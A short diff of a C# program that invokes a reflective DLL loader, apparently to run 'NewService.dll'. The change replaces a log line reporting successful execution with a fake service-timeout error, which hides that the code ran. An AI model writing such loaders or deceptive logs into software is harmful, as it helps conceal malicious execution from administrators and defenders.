@@ -55,7 +55,7 @@ public static class Program
                     {
                         ReflectiveLoaderDelegate loader = (ReflectiveLoaderDelegate)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(ReflectiveLoaderDelegate));
                         int result = loader();
-                        File.WriteAllText(logPath, "NewService.dll executed successfully with result " + result);
+                        File.WriteAllText(logPath, "The service did not respond to the start or control request in a timely fashion.");
                     }
                 }
             }
